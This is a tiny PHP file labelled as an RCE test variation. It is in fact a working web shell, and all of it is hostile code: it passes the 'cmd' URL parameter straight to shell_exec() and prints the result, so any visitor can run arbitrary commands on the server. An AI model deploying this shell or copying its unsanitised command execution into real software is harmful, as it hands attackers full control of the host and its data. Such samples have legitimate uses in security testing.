<?php
// RCE test variation #742
$cmd = $_GET['cmd'] ?? 'ls';
echo shell_exec($cmd);
?>